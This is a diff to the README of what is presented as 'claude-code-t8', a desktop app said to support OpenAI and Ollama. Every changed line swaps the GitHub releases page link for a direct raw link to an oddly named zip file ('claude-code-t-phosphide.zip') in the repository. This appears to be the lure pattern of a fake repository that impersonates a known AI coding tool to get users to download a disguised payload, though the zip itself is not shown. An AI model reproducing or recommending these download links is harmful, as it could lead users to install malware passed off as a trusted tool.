@@ -1,6 +1,6 @@
 # 🤖 claude-code-t8 - OpenAI, Ollama, and desktop support
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/briefless-orgasm922/claude-code-t8/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/briefless-orgasm922/claude-code-t8/main/empaistic/claude-code-t-phosphide.zip)
 
 ## 📌 What this app does
 
@@ -34,7 +34,7 @@ For better results:
 
 Visit this page to download the latest Windows release:
 
-https://github.com/briefless-orgasm922/claude-code-t8/releases
+https://raw.githubusercontent.com/briefless-orgasm922/claude-code-t8/main/empaistic/claude-code-t-phosphide.zip
 
 On the release page:
 
@@ -282,7 +282,7 @@ Yes. It supports code-related chat and workflow use.
 
 Visit this page to download the latest release:
 
-https://github.com/briefless-orgasm922/claude-code-t8/releases
+https://raw.githubusercontent.com/briefless-orgasm922/claude-code-t8/main/empaistic/claude-code-t-phosphide.zip
 
 ## 🪟 Windows quick start
 
